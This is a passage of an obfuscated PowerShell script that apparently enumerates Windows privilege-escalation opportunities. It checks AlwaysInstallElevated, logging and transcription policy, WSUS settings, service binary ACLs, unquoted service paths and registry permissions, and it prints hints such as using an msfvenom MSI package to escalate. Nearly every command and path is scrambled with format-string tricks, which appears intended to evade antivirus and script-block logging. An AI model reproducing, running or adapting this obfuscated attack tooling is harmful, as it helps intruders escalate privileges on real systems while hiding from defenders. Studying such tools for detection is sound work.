    if (&("{1}{2}{0}"-f 'h','Test-Pa','t') "HKU:\$_\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU") {
      &("{2}{1}{0}" -f 'st','-Ho','Write') -ForegroundColor ("{0}{1}" -f'B','lue') ((("{6}{4}{5}{3}{0}{1}{2}"-f'y Run Comma','n','ds','ntl','=CJVCJVHKU',' Rece','========'))-crEPlAcE([ChAR]67+[ChAR]74+[ChAR]86),[ChAR]124)
      foreach (${P} in ${pRO`p`ERtY}) {
        &("{3}{0}{2}{1}" -f 'ite','st','-Ho','Wr') "$((Get-Item "HKU:\$_\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"-ErrorAction SilentlyContinue).getValue($p)) " 
      }
    }
  }
}

&("{2}{1}{0}" -f'st','e-Ho','Writ') ""
if (${t`Im`eStAmp}) { &("{0}{2}{1}" -f'TimeEla','d','pse') }
&("{1}{3}{2}{0}" -f'Host','W','e-','rit') -ForegroundColor ("{1}{0}" -f 'ue','Bl') ((("{1}{3}{10}{2}{7}{9}{5}{0}{6}{8}{4}" -f ' R','====','==','=','ntly Run Commands','HKCU','ec','=7E27','e','E2','=')) -cREPlacE'7E2',[CHAr]124)
${pR`OPe`RtY} = (&("{0}{1}{2}"-f 'Ge','t','-Item') ((("{0}{10}{11}{2}{1}{3}{9}{6}{4}{5}{7}{12}{13}{8}"-f'HK','a','FTWAREax4Microsoft','x4W','ersio','nax4Explore','tV','ra','unMRU','indowsax4Curren','CU:ax4S','O','x','4R'))-crePlaCE 'ax4',[cHaR]92) -ErrorAction ("{2}{0}{1}"-f 'n','tinue','SilentlyCo')).Property
foreach (${p} in ${P`RopER`TY}) {
  &("{1}{2}{3}{0}" -f'st','Wr','it','e-Ho') "$((Get-Item "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"-ErrorAction SilentlyContinue).getValue($p)) "
}

&("{2}{1}{0}"-f 'ost','rite-H','W') ""
if (${tI`M`EStAMp}) { &("{1}{2}{0}"-f 'd','TimeElap','se') }
&("{1}{0}{2}" -f'rit','W','e-Host') -ForegroundColor ("{0}{1}"-f'Blu','e') ((("{10}{13}{8}{2}{6}{14}{12}{4}{11}{9}{0}{1}{3}{5}{7}" -f 'Ele','vat','X','ed ','lway','Chec','8','k','====8K','all ','==','s Inst',' A','===','KX')).REPlAcE('8KX',[StrinG][ChaR]124))
 
&("{2}{0}{1}" -f'o','st','Write-H') ("{0}{10}{18}{9}{6}{15}{16}{17}{14}{11}{19}{4}{3}{8}{12}{1}{7}{2}{5}{13}" -f'Ch','the ','ex','ll populate ',' (wi','ists','stalle','key ','if',' In','ecking Window','tr',' ',')','s','r R','e','gi','s','y')
if ((&("{2}{1}{0}{3}"-f 't-Item','e','G','Property') (("{8}{0}{7}{5}{4}{10}{11}{3}{6}{1}{2}{9}{12}" -f 'AREXWUP','i','ndo','W','U','liciesXW','UW','o','HKLM:XWUSOFTW','wsX','M','icrosoftX','WUInstaller')).REPlAcE(([chaR]88+[chaR]87+[chaR]85),'\') -ErrorAction ("{0}{4}{1}{2}{3}"-f'Sil','ntly','Contin','ue','e')).AlwaysInstallElevated -eq 1) {
  &("{1}{0}{2}"-f 'rite-','W','Host') ((("{12}{7}{4}{1}{19}{15}{13}{21}{3}{18}{14}{22}{20}{17}{11}{10}{5}{0}{2}{6}{9}{8}{16}"-f 'st','FTWARE','all','ci','ZSO','In','E','hl','a','lev','lways','Installer).A','HKLM:','o','s','ZP','ted = 1','ndowshlZ','e','hl','softhlZWi','li','hlZMicro')).rEplace('hlZ',[StriNg][CHAR]92)) -ForegroundColor ("{0}{1}"-f 're','d')
  &("{1}{0}{2}" -f '-','Write','Host') ("{3}{1}{6}{5}{9}{0}{4}{8}{7}{2}"-f 'age','ry m','late','T',' to ','si p','sfvenom m','ca','es','ack') -ForegroundColor ("{1}{0}" -f 'ed','r')
  &("{2}{1}{0}" -f 'st','-Ho','Write') ("{12}{6}{8}{1}{13}{11}{14}{5}{3}{9}{15}{4}{17}{7}{2}{0}{21}{20}{19}{16}{10}{18}" -f'scala','cktricks','-e','s-harden','-local-privile','ndow','ook','e','.ha','ing/wi','a','yz/w','https://b','.x','i','ndows','t','g','sploit-payloads','n#me','o','ti') -ForegroundColor ("{1}{0}"-f'w','Yello')
}
 
if ((&("{0}{1}{2}{3}" -f 'Get-ItemPro','pe','r','ty') ((("{17}{13}{16}{7}{15}{0}{11}{1}{4}{12}{6}{5}{9}{3}{8}{14}{10}{2}"-f 'l','es','ler','osoftQLRWind','QLR','c','i','QL','ows','r','RInstal','ici','M','LRSOFTWAR','QL','RPo','E','HKCU:Q')) -CRepLAcE([chaR]81+[chaR]76+[chaR]82),[chaR]92) -ErrorAction ("{5}{2}{4}{3}{1}{0}" -f 'tinue','n','t','yCo','l','Silen')).AlwaysInstallElevated -eq 1) { 
  &("{1}{3}{0}{2}"-f'te-','Wr','Host','i') (((("{20}{8}{9}{5}{15}{13}{19}{12}{2}{0}{3}{16}{17}{18}{7}{10}{11}{4}{14}{1}{6}"-f'ows',' ','ind','{','waysI','M','1','ler).','{0}SOFTWARE{0}Po','licies{0}','A','l','W','oft{','nstallElevated =','icros','0}In','st','al','0}','HKCU:')) -F  [ChAR]92)) -ForegroundColor ("{0}{1}"-f 'r','ed')
  &("{3}{0}{2}{1}" -f't','st','e-Ho','Wri') ("{6}{5}{1}{3}{0}{7}{4}{2}"-f 'to ','si pac','ate','kage ','scal','msfvenom m','Try ','e') -ForegroundColor ("{0}{1}" -f're','d')
  &("{2}{0}{1}{3}"-f 'rite-H','o','W','st') ("{2}{16}{20}{6}{13}{14}{19}{18}{5}{0}{11}{17}{4}{1}{9}{12}{15}{10}{7}{3}{8}"-f'n','g','htt','etasploit-payl','s-hardenin','i','ck','ion#m','oads','/wi','escalat','d','ndows','tri','cks.','-local-privilege-','ps://b','ow','z/w','xy','ook.ha') -ForegroundColor ("{1}{0}{2}"-f'lo','Yel','w')
}


&("{3}{1}{2}{0}"-f 't','te','-Hos','Wri') ""
if (${t`im`estaMp}) { &("{3}{1}{0}{2}"-f 'E','ime','lapsed','T') }
&("{3}{0}{2}{1}" -f'e-H','st','o','Writ') -ForegroundColor ("{1}{0}"-f'lue','B') ((("{8}{7}{5}{9}{4}{6}{0}{1}{3}{2}" -f'h','e','o','ll Inf','3 Pow','==','erS','=','=','=====Qd3Qd')).REPlACE(([cHar]81+[cHar]100+[cHar]51),'|'))

(&("{1}{2}{3}{0}" -f 'erty','Get-It','emP','rop') ((("{14}{8}{3}{2}{11}{9}{5}{10}{13}{4}{7}{1}{15}{12}{0}{6}{17}{16}"-f'ft{0}Powe','SO','t','is','INE{0','EY_LO','rShell{0}1{0}PowerSh','}','eg','K','CAL_MA','ry::H','oso','CH','r','FTWARE{0}Micr','e','ellEngin')) -f[chAr]92)).PowerShellVersion | &("{3}{2}{0}{1}" -f'h-Obje','ct','Eac','For') {
  &("{1}{2}{0}" -f'te-Host','W','ri') ('PowerShel'+'l'+' '+"$_ "+'ava'+'ilab'+'l'+'e')
}
(&("{1}{2}{3}{0}" -f'ty','Get-ItemPr','ope','r') ((("{2}{18}{6}{10}{9}{19}{13}{16}{1}{17}{15}{11}{3}{8}{4}{7}{0}{5}{12}{14}" -f'e','HB','registry','PowerS','zHB3zHB','rShell',':H','Pow','hell','Y','KE','oftzHB','En','NEzHBS','gine','ros','OFTWAREz','Mic',':','_LOCAL_MACHI'))-RePLAcE 'zHB',[chAR]92)).PowerShellVersion | &("{1}{0}{3}{2}{4}"-f 'r','Fo','ach-O','E','bject') {
  &("{0}{1}{2}"-f 'Wri','te-Hos','t')  ('Pow'+'erShe'+'ll'+' '+"$_ "+'a'+'vailable')
}


&("{1}{0}{2}"-f'ite-H','Wr','ost') ""
if (${TimE`ST`A`mp}) { &("{2}{1}{0}"-f'sed','lap','TimeE') }
&("{1}{2}{3}{0}" -f'-Host','W','ri','te') -ForegroundColor ("{1}{0}"-f'ue','Bl') ((("{4}{12}{6}{3}{7}{15}{10}{8}{1}{2}{16}{0}{14}{11}{9}{5}{13}"-f 's','ist','ry T','=','=',' Che','=====','={0}{0','Shell Reg','pt','r','ri','=','ck','c','} Powe','ran')) -f[Char]124)

if (&("{2}{0}{1}" -f 't-Pat','h','Tes') (("{9}{4}{8}{3}{15}{10}{7}{11}{12}{16}{6}{5}{1}{14}{13}{0}{2}"-f'Shell2','ws','MBTranscription','BSo','CU:2','Windo','ft2MB','2','M','HK','re','MBPolic','ies2','r','2MBPowe','ftwa','MBMicroso')).rePLaCe('2MB',[STRInG][CHAr]92)) {
  &("{0}{2}{1}"-f'G','tem','et-I') (("{0}{2}{9}{6}{15}{5}{4}{7}{10}{3}{12}{1}{13}{14}{11}{8}"-f'H','ell0aB','KCU:0aBSoftware0','s0','aBM','s0','BPol','icrosoft0aBWi','ion','a','ndow','ipt','aBPowerSh','T','ranscr','icie')).RepLacE('0aB',[sTrInG][CHaR]92)
}
if (&("{0}{1}{2}" -f'Tes','t-','Path') ((("{12}{4}{13}{1}{0}{16}{7}{3}{10}{8}{15}{14}{11}{2}{5}{6}{9}"-f'tw','Sof','}Tr','licies{0',':{0','anscript','io','}Po','oft{0','n','}Micros','indows{0}PowerShell{0','HKLM','}','W','}','are{0'))-F  [cHAR]92)) {
  &("{1}{0}" -f'em','Get-It') (("{20}{12}{14}{6}{17}{15}{5}{0}{3}{9}{16}{13}{10}{21}{2}{7}{18}{1}{19}{22}{8}{11}{4}" -f 'e','rShe','Po','I9cP','n','r','cSo','w','p','olicie','dowsI9','tio','KLM:','icrosoftI9cWin','I9','wa','sI9cM','ft','e','llI9cTra','H','c','nscri')).RePlaCe('I9c',[sTRinG][ChAr]92)
}
if (&("{1}{0}"-f 'Path','Test-') ((("{9}{0}{14}{7}{4}{10}{2}{16}{15}{18}{17}{8}{1}{6}{3}{11}{12}{13}{5}" -f'432','WfPow','olicies','Sh','fSoftware3W','ion','er','ode3W','dows3','HKCU:3WfWow6','fP','ell3WfTranscr','i','pt','N','WfMi','3','soft3WfWin','cro'))  -REPLACe'3Wf',[cHaR]92)) {
  &("{1}{0}{2}" -f'-It','Get','em') (("{13}{3}{18}{12}{16}{0}{9}{15}{2}{4}{7}{6}{1}{11}{10}{8}{17}{14}{5}" -f 'kXJS','Po','kX','CU:kXJ','JMicrosoftkXJW','on','wskXJ','indo','kXJTranscr','oftwarekXJPol','hell','werS','4','HK','i','icies','32Node','ipt','Wow6')).rePLACe(([chAR]107+[chAR]88+[chAR]74),'\')
}
if (&("{2}{1}{0}" -f 'ath','t-P','Tes') (("{17}{16}{5}{13}{18}{11}{9}{20}{7}{14}{12}{22}{0}{4}{23}{15}{21}{2}{10}{3}{19}{8}{1}{6}"-f 'jMic','n','o','owerSh','ros','i','scription','iwj','wjTra','6432','wsiwjP','w','wjPol','wjW','Softwarei','in',':','HKLM','o','elli','Node','d','iciesiw','oftiwjW')).rEPLacE('iwj',[stRiNg][cHAR]92)) {
  &("{1}{0}{2}"-f 't','Ge','-Item') ((("{8}{6}{15}{4}{10}{26}{21}{1}{3}{14}{2}{20}{25}{13}{22}{12}{0}{9}{23}{18}{19}{7}{5}{24}{11}{17}{16}"-f'o','licies2qc','2q','Micr','f','an','KLM:2qcWow6432Node2qcS','r','H','wer','tw','c','cP','ows2','osoft','o','tion','rip','l2q','cT','cWin','Po','q','Shel','s','d','are2qc'))-CrePlAcE([chaR]50+[chaR]113+[chaR]99),[chaR]92)
}
 

&("{0}{1}{2}" -f'Write-Ho','s','t') ""
if (${T`I`M`EstAmP}) { &("{0}{2}{1}" -f 'Tim','sed','eElap') }
&("{0}{2}{1}"-f 'Wr','t','ite-Hos') -ForegroundColor ("{0}{1}" -f'B','lue') ((("{4}{3}{8}{7}{2}{6}{5}{1}{0}"-f 'Check',' ','rShell Mod','===','=','Log','ule ','e','=====1fX1fX Pow')).RePlAce('1fX',[strINg][CHAr]124))
if (&("{1}{2}{0}"-f'ath','T','est-P') ((("{14}{19}{12}{16}{9}{15}{17}{0}{7}{13}{10}{5}{3}{11}{20}{2}{1}{4}{8}{6}{21}{18}"-f '0}','l','She','in','l{','}W','uleLo','M','0}Mod','P','ft{0','do','tw','icroso','HKCU:{0}So','olicie','are{0}','s{','ing','f','ws{0}Power','gg'))-F[CHAR]92)) {
  &("{1}{2}{0}"-f'em','Get-I','t') (("{10}{19}{0}{21}{3}{5}{12}{1}{7}{11}{13}{17}{15}{14}{4}{16}{2}{18}{9}{20}{8}{6}" -f're','r','e','olici','93Power','esA93Mi','g','os','n','A93Mo','HKCU:A9','oft','c','A9','A','s','Sh','3Window','ll','3Softwa','duleLoggi','A93P')).repLaCe('A93','\')
}
if (&("{1}{0}"-f 'th','Test-Pa') (("{10}{11}{3}{13}{19}{14}{15}{16}{20}{6}{0}{7}{12}{9}{18}{2}{5}{1}{4}{8}{17}"-f 'of','llocyModule','Power','ocy','Logg','She','cros','to','i','y','H','KLM:','c','S','twareocy','Poli','ciesocy','ng','Windowsocy','of','Mi')).REplaCe('ocy',[STrINg][cHAR]92)) {
  &("{0}{1}{2}"-f 'G','et-It','em') ((("{12}{16}{13}{18}{5}{10}{17}{0}{1}{15}{6}{11}{8}{9}{14}{7}{4}{3}{2}" -f'cr','os','g','n','Loggi','Polic','t{0}Windo','e','s{0}Power','Shell{0}Modu','ies{0}','w','HK','ftwar','l','of','LM:{0}So','Mi','e{0}'))-F  [char]92)
}
if (&("{0}{2}{1}" -f 'Test','th','-Pa') ((("{15}{6}{16}{18}{3}{4}{13}{2}{0}{1}{19}{10}{8}{5}{11}{17}{7}{9}{12}{14}" -f'olicies','EUJM','JP','32Node','EUJSoftwareE','er','KCU:EUJ','eLog','indowsEUJPow','g','softEUJW','ShellEUJModu','i','U','ng','H','Wow6','l','4','icro')) -REPLaCE'EUJ',[CHAr]92)) {
  &("{1}{0}"-f 'm','Get-Ite') ((("{9}{2}{3}{16}{11}{4}{10}{8}{17}{6}{12}{7}{13}{14}{1}{5}{0}{15}"-f'duleLoggin','l{0}','0','}Wo','2','Mo','cies{0}Mi','}','od','HKCU:{','N','43','crosoft{0','Windows{0}Pow','erShel','g','w6','e{0}Software{0}Poli'))  -F [Char]92)
}
if (&("{0}{1}" -f 'Test-Pa','th') ((("{19}{9}{6}{21}{17}{12}{14}{1}{7}{11}{4}{18}{16}{22}{5}{20}{15}{26}{24}{10}{8}{3}{25}{23}{13}{0}{2}"-f 'g','rSoftwareBarP','ing','Shell','B','oft','Wow','oli','sBarPower','r','w','cies','32No','rModuleLog','deBa','arW','rMic','4','a','HKLM:Ba','B','6','ros','a','do','B','in')) -REplAce  'Bar',[CHAR]92)) {
  &("{0}{1}{2}"-f 'Get-I','t','em') (("{6}{15}{8}{18}{13}{23}{21}{1}{4}{19}{5}{11}{3}{25}{9}{22}{20}{10}{12}{7}{0}{17}{2}{16}{14}{24}"-f'Pow','ybJ','Shel','i','Sof','b','HKLM:yb','wsybJ','Wow','i','t','JPol','ybJWindo','3','oduleLog','J','lybJM','er','64','twarey','of','ode','esybJMicros','2N','ging','c')).rEplace(([ChaR]121+[ChaR]98+[ChaR]74),'\')
}
 

&("{3}{2}{0}{1}"-f'-','Host','rite','W') ""
if (${t`I`meStA`mp}) { &("{2}{0}{1}"-f'e','Elapsed','Tim') }
&("{2}{1}{0}{3}"-f 'ite-Ho','r','W','st') -ForegroundColor ("{1}{0}"-f'ue','Bl') ((("{8}{9}{1}{3}{0}{5}{2}{6}{7}{4}"-f'==k','===','c','=','k Log Check','Q8kQ8 PowerShell S','ri','pt Bloc','=','==')) -CrePLacE ([ChAR]107+[ChAR]81+[ChAR]56),[ChAR]124)
 
if ( &("{0}{1}"-f 'Test-Pat','h') ((("{11}{13}{5}{4}{8}{10}{6}{3}{7}{1}{9}{14}{12}{2}{0}"-f 'Logging','ell{0','ck','{0}PowerS','e{0}Policies{0}','war','ndows','h','Microso','}Sc','ft{0}Wi','HKCU:{0}So','lo','ft','riptB')) -f  [CHar]92)) {
  &("{1}{2}{0}"-f'tem','Get','-I') ((("{11}{16}{1}{13}{10}{8}{6}{9}{4}{17}{0}{2}{14}{15}{12}{3}{7}{5}" -f'dows{0}P','ar','owerShel','Logg','0}','g','licies{0}Mi','in','o','crosoft{','}P','HKCU','lock','e{0','l{0}Scrip','tB',':{0}Softw','Win')) -f[ChAr]92)
}
if ( &("{2}{1}{3}{0}" -f'Path','es','T','t-') (("{13}{18}{1}{6}{4}{11}{0}{14}{5}{12}{3}{7}{8}{19}{16}{10}{15}{17}{9}{2}" -f'NdP','twareN','lockLogging','NdPWindowsNdP','PPol','c','d','Pow','erS','ptB','Sc','icies','rosoft','HKL','Mi','r','ellNdP','i','M:NdPSof','h')).rEPLaCE('NdP',[StrING][ChAR]92)) {
  &("{2}{0}{1}" -f'It','em','Get-') (("{19}{17}{20}{11}{13}{9}{10}{2}{18}{3}{12}{15}{6}{5}{14}{1}{7}{8}{0}{4}{16}"-f 'p','wsaN5','saN5M','cro','t','nd','Wi','PowerShell','aN5Scri','twa','reaN5Policie','N','sof','5Sof','o','taN5','BlockLogging','LM','i','HK',':a')).rEPlACE('aN5',[StRiNg][Char]92)
}
if ( &("{1}{0}"-f 'ath','Test-P') ((("{17}{18}{8}{13}{14}{23}{19}{4}{5}{16}{10}{0}{2}{15}{1}{9}{6}{12}{20}{22}{7}{3}{11}{21}"-f'ro','0feWindows','sof','kLo','ePoli','cie','feP','oc','eWow64','0','Mic','ggi','o','32Node','0feSof','t','s0fe','HK','CU:0f','f','we','ng','rShell0feScriptBl','tware0'))-REPlAcE '0fe',[Char]92)) {
  &("{1}{0}{2}"-f't-Ite','Ge','m') ((("{14}{12}{11}{21}{13}{7}{1}{20}{4}{17}{16}{5}{19}{10}{2}{3}{22}{6}{0}{9}{18}{8}{15}"-f'PowerShell','aXzP','taXzWi','ndow','ici','zMi','z','are','Loggi','aXzScriptBl','sof','zWow6432','CU:aX','w','HK','ng','saX','e','ock','cro','ol','NodeaXzSoft','saX')) -rEPLAce  ([chAr]97+[chAr]88+[chAr]122),[chAr]92)
}
if ( &("{1}{0}{2}" -f'at','Test-P','h') (("{18}{15}{0}{13}{7}{5}{9}{3}{8}{11}{17}{1}{16}{2}{12}{4}{6}{10}{14}"-f'FWow6432','t9xFWi','F','es','r','Software9x','Shel','F','9xFMicro','FPolici','l9','s','Powe','Node9x','xFScriptBlockLogging','9x','ndows9x','of','HKLM:')).rEPlace(([Char]57+[Char]120+[Char]70),[sTRINg][Char]92)) {
  &("{1}{0}"-f'em','Get-It') ((("{16}{14}{17}{1}{10}{0}{15}{4}{13}{8}{7}{11}{12}{9}{5}{3}{2}{6}" -f 'ftwar','N','l','tB','{0','}PowerShell{0}Scrip','ockLogging','es{0}Micr','olici','s{0','ode{0}So','osoft{0','}Window','}P','}Wow64','e','HKLM:{0','32')) -F[CHAr]92)
}


&("{1}{0}{3}{2}"-f 'H','Write-','t','os') ""
if (${Time`s`T`AMp}) { &("{1}{0}{3}{2}" -f'eElap','Tim','ed','s') }
&("{1}{2}{0}{3}"-f'e','Wri','t','-Host') -ForegroundColor ("{1}{0}" -f'ue','Bl') ((("{2}{5}{3}{8}{0}{13}{4}{9}{10}{7}{6}{14}{15}{16}{11}{12}{1}"-f't','exploit','=========Ay2Ay2 WS','o','= 1','US check f','ue,','f tr','r ht',', ','i','lnerable t','o ','p and UseWAServer ',' might b','e v','u'))  -cREpLace  'Ay2',[chAr]124)
&("{0}{1}{2}"-f'W','rit','e-Host') ("{11}{7}{13}{9}{3}{1}{4}{5}{14}{10}{0}{6}{8}{2}{12}"-f'sc','rde','ation#wsu','-ha','ning/windows-l','ocal-p','a','ttps://boo','l','ndows','ilege-e','h','s','k.hacktricks.xyz/wi','riv') -ForegroundColor ("{2}{1}{0}"-f 'ow','ll','Ye')
if (&("{0}{1}{2}" -f 'Test-Pa','t','h') ((("{2}{12}{15}{6}{19}{4}{13}{0}{18}{9}{3}{16}{17}{11}{7}{5}{8}{14}{1}{10}"-f'ici','wsUpd','H','}Mic','TWARE{0','ows','0}S','nd','{0','s{0','ate','Wi','KL','}Pol','}Windo','M:{','ros','oft{0}','e','OF')) -F  [cHaR]92)) {
  &("{0}{1}{2}" -f 'G','et-It','em') ((("{3}{16}{14}{4}{7}{15}{6}{13}{9}{5}{2}{12}{11}{0}{8}{10}{17}{1}" -f '}W','ate','}Wi','HKLM:{0}SO','RE{0}P','0','}Mic','ol','indows','soft{','Up','ows{0','nd','ro','WA','icies{0','FT','d')) -f [cHAr]92)
}
if ((&("{0}{3}{2}{1}" -f 'G','roperty','ItemP','et-') ((("{13}{10}{17}{0}{18}{6}{15}{1}{9}{2}{7}{5}{14}{8}{3}{16}{12}{11}{4}"-f 'S','{','Po','0}W','}AU','{0}Micro','FTWAR','licies','dows{','0}','M:','e{0','at','HKL','soft{0}Win','E','indowsUpd','{0}','O')) -f [ChaR]92) -Name ("{1}{0}{3}{2}" -f'EWU','US','er','Serv') -ErrorAction ("{1}{3}{4}{0}{2}" -f 'nu','Si','e','lentlyCont','i')).UseWUServer) {
  (&("{2}{1}{0}{3}" -f'er','rop','Get-ItemP','ty') ((("{17}{12}{4}{13}{5}{16}{9}{8}{6}{18}{11}{14}{7}{1}{3}{15}{2}{10}{0}" -f 'U','q','indowsU','xWi','W','aqxPolic','i','fta','qxM','a','pdateaqxA','r','M:aqxSOFT','ARE','oso','ndowsaqxW','ies','HKL','c'))-replaCe 'aqx',[chAr]92) -Name ("{2}{0}{1}" -f'USer','ver','USEW')).UseWUServer
}


&("{0}{1}{2}" -f 'Wr','it','e-Host') ""
if (${t`im`esTamp}) { &("{1}{0}{2}"-f'Elap','Time','sed') }
&("{2}{1}{0}{3}"-f'-Ho','te','Wri','st') -ForegroundColor ("{0}{1}" -f 'Bl','ue') ((("{12}{10}{11}{0}{6}{1}{4}{7}{2}{9}{3}{8}{5}"-f 'WqOWqO In','et','s H','U',' Settin','/ HKLM','tern','g',' ','KC','======','==','=')) -RepLAcE ([cHaR]87+[cHaR]113+[cHaR]79),[cHaR]124)

${pRO`PEr`Ty} = (&("{0}{1}{2}"-f 'Get-','It','em') ((("{14}{12}{4}{18}{6}{5}{11}{13}{7}{2}{1}{15}{16}{8}{19}{17}{0}{9}{3}{10}"-f'tt','ntVersi','Curre','ng','0','osof','icr','ws{0}','et','i','s','t{0}','0}Software{','Windo','HKCU:{','on{0}I','ntern','e','}M',' S')) -F[cHaR]92) -ErrorAction ("{0}{2}{4}{3}{1}" -f'Sil','ue','ently','in','Cont')).Property
foreach (${p} in ${p`ROPer`TY}) {
  &("{0}{1}{2}{3}" -f'W','r','ite-H','ost') "$p - $((Get-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"-ErrorAction SilentlyContinue).getValue($p)) "
}
 
${P`ROPe`RtY} = (&("{1}{2}{0}" -f 'em','Get','-It') ((("{4}{0}{16}{1}{12}{6}{7}{18}{20}{3}{9}{2}{17}{11}{14}{19}{8}{15}{13}{10}{5}"-f 'K',':iISSoftwareiI','IS','o','H','ngs','M','i','ter','ftiISWindowsi','tti','rrentVersion','S',' Se','iISI','net','LM','Cu','cro','n','s')).REPLAcE('iIS',[sTring][CHAr]92)) -ErrorAction ("{3}{1}{0}{2}" -f 'tlyConti','ilen','nue','S')).Property
foreach (${P} in ${PrOP`ER`Ty}) {
  &("{2}{1}{0}"-f 'st','-Ho','Write') "$p - $((Get-Item "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"-ErrorAction SilentlyContinue).getValue($p)) "
}




&("{2}{1}{0}"-f't','ite-Hos','Wr') ""
if (${TImesT`A`Mp}) { &("{2}{0}{1}{3}" -f 'e','Elapse','Tim','d') }
&("{3}{0}{1}{2}"-f 'rit','e-Hos','t','W') -ForegroundColor ("{0}{1}" -f'Bl','ue') ((("{3}{1}{0}{6}{2}{4}{5}"-f 'doEd','=======','E R','==','UNNING PROCE','SSES','o')) -rEPLAce  'doE',[char]124)


&("{1}{2}{0}"-f 't','Write-H','os') ""
if (${TI`Me`StAMp}) { &("{1}{2}{3}{0}"-f'sed','T','im','eElap') }
&("{0}{1}{2}{3}" -f'Writ','e-Ho','s','t') -ForegroundColor ("{1}{0}"-f 'ue','Bl') ((("{12}{7}{13}{9}{2}{15}{4}{16}{10}{6}{14}{5}{3}{11}{0}{1}{8}" -f'g p','r','Wt ','ons on r',' ','missi','p','=====','ocesses','=6Wt6','ser ','unnin','==','=','er','Checking','u'))  -RePLaCe ([ChaR]54+[ChaR]87+[ChaR]116),[ChaR]124)
&("{2}{0}{1}{3}" -f 't-P','roce','Ge','ss') | &("{2}{1}{3}{0}" -f 'ect','elect','S','-Obj') ("{0}{1}"-f'Pat','h') -Unique | &("{1}{0}{2}"-f'orEac','F','h-Object') { &("{1}{0}{3}{2}" -f 'art-A','St','Check','CL') -Target ${_}.path }



&("{2}{0}{1}"-f 'ite','-Host','Wr') ""
if (${T`iM`EsTaMp}) { &("{3}{0}{1}{2}"-f'ime','Elaps','ed','T') }
&("{2}{0}{1}" -f 'Ho','st','Write-') -ForegroundColor ("{1}{0}"-f 'e','Blu') ((("{4}{5}{0}{9}{1}{8}{3}{7}{2}{6}"-f '=','5','ce',' S','=','======','sses','ystem pro','Me5','=Me'))  -CrEPLACE  ([chaR]77+[chaR]101+[chaR]53),[chaR]124)
&("{2}{1}{3}{0}"-f 'ess','tart-','S','Proc') ("{0}{1}{2}"-f'ta','sklis','t') -ArgumentList ((("{2}{0}{1}{3}{4}"-f 'rname eq',' sy','/v /fi 6gJuse','stem6g','J')).ReplACE('6gJ',[sTrINg][cHAR]34)) -Wait -NoNewWindow



&("{1}{0}{2}" -f 'o','Write-H','st') ""
if (${tI`m`eSTAmP}) { &("{1}{2}{0}" -f 'meElapsed','T','i') }
&("{0}{1}{2}" -f 'Write','-H','ost') -ForegroundColor ("{1}{0}"-f'e','Blu') ((("{3}{4}{0}{6}{5}{1}{2}" -f '=={0}{0} SE','u','lnerable check','=','======','E path v','RVIC'))  -F  [char]124)
&("{1}{3}{0}{2}"-f 'o','Writ','st','e-H') ("{3}{2}{0}{5}{4}{1}" -f'for vulnera','e','cking ','Che','le service .ex','b')

${uniq`U`EsErv`ic`es} = @{}
&("{3}{1}{2}{0}" -f 'bject','Wmi','O','Get-') ("{0}{3}{2}{1}" -f'W','ce','n32_Servi','i') | &("{2}{1}{0}" -f '-Object','e','Wher') { ${_}.PathName -like ("{1}{0}{2}"-f'.','*','exe*') } | &("{4}{2}{1}{3}{0}"-f 'ject','ac','rE','h-Ob','Fo') {
  ${pa`TH} = (${_}.PathName -split ((("{1}{3}{2}{0}"-f 'exe9Sfb)','(?<=9S','.','f')).replAcE(([cHAr]57+[cHAr]83+[cHAr]102),'\')))[0].Trim('"')
  ${UN`iq`UESeRviCEs}[${pa`Th}] = ${_}.Name
}
foreach ( ${h} in (${UniQUese`R`VI`CEs} | &("{0}{3}{1}{2}"-f'Sel','ct-Obj','ect','e') -Unique).GetEnumerator()) {
  &("{1}{3}{0}{2}{4}" -f'art-A','S','CLCh','t','eck') -Target ${h}.Name -ServiceName ${h}.Value
}



&("{2}{0}{1}" -f'e','-Host','Writ') ""
if (${t`Ime`sT`Amp}) { &("{2}{1}{0}{3}" -f'e','ps','TimeEla','d') }
&("{2}{1}{0}"-f'Host','te-','Wri') -ForegroundColor ("{0}{1}" -f 'Blu','e') ((("{9}{10}{2}{4}{3}{0}{7}{5}{1}{11}{6}{8}"-f 'ing ','uote',' C','ck','he','nq','ervi','for U','ce Paths','=========','Bo4Bo4','d S'))-cRePlaCe  ([char]66+[char]111+[char]52),[char]124)



&("{3}{4}{6}{0}{1}{5}{2}" -f'vicePa','thCh','ck','Unquote','dS','e','er')



&("{1}{3}{0}{2}" -f'te-H','W','ost','ri') ""
if (${Ti`m`ESTamp}) { &("{2}{1}{0}"-f 'sed','meElap','Ti') }
&("{1}{2}{0}" -f 'ite-Host','W','r') -ForegroundColor ("{0}{1}"-f 'B','lue') ((("{1}{14}{5}{9}{3}{8}{2}{6}{7}{0}{15}{13}{11}{10}{12}{4}" -f ' R','=','c','0} ','ons','======{0','king Servic','e','Che','}{','try Permi','s','ssi','i','==','eg'))-f [chAr]124)
&("{3}{1}{0}{2}"-f'i','r','te-Host','W') ("{0}{7}{3}{6}{4}{1}{5}{2}"-f'T','e','some time.',' will t','k',' ','a','his')

&("{1}{0}{2}"-f'ldIte','Get-Chi','m') ((("{1}{0}{5}{7}{4}{3}{2}{6}{8}"-f'L','HK','S','ontrol','entC','M:jDUSystemjD','etjDUservicesjD','UCurr','U')).REplaCe('jDU','\')) | &("{1}{2}{0}" -f 'ject','ForEach-','Ob') {
  ${Ta`R`geT} = ${_}.Name.Replace(("{3}{2}{1}{0}" -f 'CHINE','Y_LOCAL_MA','KE','H'), ("{0}{1}" -f 'h','klm:'))
  &("{0}{2}{1}{4}{3}" -f'S','cl','tart-a','eck','ch') -Target ${T`A`RgET}
}



&("{1}{2}{0}" -f'-Host','W','rite') ""
if (${ti`Me`ST`AmP}) { &("{2}{1}{0}"-f'sed','Elap','Time') }
&("{0}{3}{2}{1}"-f 'W','Host','ite-','r') -ForegroundColor ("{0}{1}"-f'Bl','ue') ((("{7}{2}{10}{8}{12}{14}{11}{1}{5}{6}{3}{9}{0}{13}{4}"-f 'l','S','WdU','e','ck',' vul','n','=========','U SCHEDUL','rab','Wd','K','ED','e che',' TAS')).ReplAce(([cHAR]87+[cHAR]100+[cHAR]85),'|'))


&("{1}{2}{0}"-f'Host','Wr','ite-') ""
if (${tImes`T`Amp}) { &("{2}{0}{1}" -f 'laps','ed','TimeE') }
